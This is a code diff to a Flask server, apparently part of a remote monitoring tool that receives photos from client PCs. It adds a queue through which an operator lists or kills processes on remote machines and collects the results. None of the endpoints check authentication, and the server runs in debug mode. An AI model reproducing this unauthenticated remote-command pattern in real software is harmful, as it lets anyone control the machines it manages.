@@ -4,6 +4,14 @@ import threading
 import os
 import uuid
 
+# pending commands (process list / kill) на клиента
+commands = {}          # (client, pc) -> list of {id, type, ...}
+commands_lock = threading.Lock()
+
+# результаты выполнения команд (клиент присылает обратно)
+command_results = {}   # (client, pc) -> {cmd_id: {...}}
+command_results_lock = threading.Lock()
+
 app = Flask(__name__)
 
 clients = {}
@@ -150,6 +158,75 @@ def sent_photo1(client, pc):
         "pc": pc,
         "size": len(data),
     })
+
+# ---------- Диспетчер задач: команды ----------
+
+@app.route("/sent/command/<client>/<pc>/", methods=["POST"])
+def sent_command(client, pc):
+    if "/" in client or "\\" in client or "/" in pc or "\\" in pc:
+        return jsonify({"Succes": False})
+
+    payload = request.get_json(silent=True) or {}
+    ctype = payload.get("type")
+
+    if ctype == "list_processes":
+        cmd = {"id": uuid.uuid4().hex, "type": "list_processes"}
+    elif ctype == "kill_process":
+        pid = payload.get("pid")
+        name = str(payload.get("name", ""))[:200]
+        if not isinstance(pid, int) or pid <= 0:
+            return jsonify({"Succes": False, "Error": "bad pid"})
+        cmd = {"id": uuid.uuid4().hex, "type": "kill_process",
+               "pid": pid, "name": name}
+    else:
+        return jsonify({"Succes": False, "Error": "unknown type"})
+
+    with commands_lock:
+        commands.setdefault((client, pc), []).append(cmd)
+
+    return jsonify({"Succes": True, "id": cmd["id"]})
+
+
+@app.route("/command/<client>/<pc>/")
+def get_command(client, pc):
+    if "/" in client or "\\" in client or "/" in pc or "\\" in pc:
+        return jsonify({"Succes": False})
+
+    with commands_lock:
+        pending = commands.get((client, pc), [])
+        if pending:
+            cmd = pending.pop(0)
+            if not pending:
+                commands.pop((client, pc), None)
+            return jsonify({"Succes": True, "command": cmd})
+
+    return jsonify({"Succes": True, "command": None})
+
+
+@app.route("/result/<client>/<pc>/<cmd_id>/", methods=["POST"])
+def post_result(client, pc, cmd_id):
+    if "/" in client or "\\" in client or "/" in pc or "\\" in pc:
+        return jsonify({"Succes": False})
+
+    payload = request.get_json(silent=True) or {}
+    with command_results_lock:
+        command_results.setdefault((client, pc), {})[cmd_id] = payload
+    return jsonify({"Succes": True})
+
+
+@app.route("/result/<client>/<pc>/<cmd_id>/", methods=["GET"])
+def get_result(client, pc, cmd_id):
+    if "/" in client or "\\" in client or "/" in pc or "\\" in pc:
+        return jsonify({"Succes": False})
+
+    with command_results_lock:
+        res = command_results.get((client, pc), {}).pop(cmd_id, None)
+        if res is None:
+            return jsonify({"Succes": True, "result": None})
+        # почистим пустое
+        if not command_results.get((client, pc)):
+            command_results.pop((client, pc), None)
+    return jsonify({"Succes": True, "result": res})
 
 if __name__ == "__main__":
     app.run(debug=True)
